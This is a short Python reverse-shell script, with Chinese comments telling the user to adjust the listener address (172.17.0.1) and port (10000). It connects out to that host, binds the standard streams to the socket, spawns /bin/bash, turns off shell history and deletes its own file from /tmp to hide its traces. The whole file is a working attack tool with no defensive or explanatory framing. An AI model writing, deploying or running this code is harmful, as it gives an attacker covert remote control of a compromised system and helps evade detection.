import os
import pty
import socket

lhost = "172.17.0.1" # 根据实际情况修改
lport = 10000 # 根据实际情况修改

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    os.remove('/tmp/.x.py')
    s.close()

if __name__ == "__main__":
    main()